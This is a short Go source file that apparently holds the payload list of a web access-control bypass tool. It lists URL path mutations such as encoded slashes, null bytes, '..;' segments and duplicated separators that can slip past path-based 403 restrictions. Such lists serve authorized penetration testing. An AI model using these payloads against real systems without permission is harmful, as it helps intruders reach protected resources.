package path

var paths = []string{
	"$1/%2f/$2", "$1/$2/%2f/", "$1/$2%2f/", "$1/$2//%3B/",
	"$1//%3B/$2", "$1/%00/$2", "$1/$2%00/", "$1/$2/%00/", "$1/%0d/$2",
	"$1/$2%0d/", "$1/$2/%0d/", "$1/%23/$2", "$1/$2%23/", "$1/$2/%23/",
	"$1/*/$2", "$1/$2*/", "$1/$2/*/", "$1/%252e**/$2", "$1/$2%252e**/",
	"$1/$2/%252e**/", "$1/%ef%bc%8f/$2", "$1/$2%ef%bc%8f/", "$1/$2/%ef%bc%8f/",
	"$1/%2e/$2", "$1/$2/.", "$1//$2//", "$1//$2", "$1///$2///", "$1///$2", "$1/./$2/./",
	"$1/./$2", "$1/$2%20", "$1/$2%09", "$1/$2?", "$1/$2.html", "$1/$2/?anything",
	"$1/$2#", "$1/$2/*", "$1/$2.php", "$1/$2.json", "$1/$2..;/",
	"$1/$2/..;/", "$1/$2/..;", "$1..;/$2", "$1/..;$2", "$1/$2;/",
}
